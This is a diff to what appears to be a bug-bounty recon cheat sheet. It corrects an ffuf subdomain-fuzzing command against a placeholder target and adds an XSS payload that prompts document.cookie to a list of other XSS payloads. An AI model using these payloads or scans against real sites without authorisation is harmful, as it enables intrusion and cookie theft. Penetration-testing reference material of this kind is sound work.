@@ -25,7 +25,7 @@ subfinder -dL subfinder.txt | tee -a subfinders.txt
 findomain -t target.com  | tee -a  findomain.txt
 ```
 ```bash
-ffuf -u https://target.com -H "Host:FUZZ.target.com" -w -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
+ffuf -u https://target.com -H "Host:FUZZ.target.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 
 
 ```
 ```bash
@@ -235,6 +235,7 @@ nuclei -u https://targets.com:8858 -t /root/nuclei-template/
 
 #### Random Payload to use: 
 ```bash
+• "><img src/onerror=prompt(document.cookie)>
 • "><img src=x onerror=alert(document.domain)> 
 • <svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
 • <script src="data:,alert(1)%250A-->
